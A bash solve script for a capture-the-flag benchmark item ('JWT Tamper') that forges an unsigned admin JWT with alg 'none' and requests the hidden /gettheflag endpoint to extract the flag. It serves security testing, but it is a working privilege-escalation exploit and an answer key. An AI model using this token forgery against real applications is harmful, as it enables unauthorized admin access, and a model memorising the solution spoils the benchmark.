#!/usr/bin/env bash
# XBEN-091-24 — "JWT Tamper" (tags: jwt, privilege_escalation)
#
# The application issues its tokens with `algorithm='none'` and reads them back
# with `options={"verify_signature": False}`. Nothing about the token is
# checked, so nothing about it needs to be forged: a header of `{"alg":"none"}`
# and a body claiming the admin role is a token the application accepts.
#
# `/profile` renders a link to `/gettheflag` with `display:none`, which is a
# hint about the intended path rather than a control; the endpoint is asked for
# directly here.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
H5I="${H5I:-h5i}"
SESSION="xben091-$$"
trap '"$H5I" browser close --session "$SESSION" >/dev/null 2>&1' EXIT

token="$(python3 -c '
import base64, json
part = lambda o: base64.urlsafe_b64encode(json.dumps(o, separators=(",", ":")).encode()).rstrip(b"=").decode()
print(part({"typ": "JWT", "alg": "none"}) + "." + part({"username": "admin", "role": "admin"}) + ".")
')"
"$H5I" browser open "$URL/" --session "$SESSION" --new --capture >/dev/null
seq="$("$H5I" websec replay req_0 --create \
    --set 'path=/gettheflag' --set "header.Cookie=token=$token" \
    --session "$SESSION" | python3 -c 'import json,sys; print(json.load(sys.stdin)["seq"])')"
"$H5I" websec show "res_$seq" --session "$SESSION" |
    python3 -c 'import re,sys; m=re.search(r"FLAG\{[a-f0-9]{64}\}", sys.stdin.read()); print(m.group(0) if m else "no flag found")'
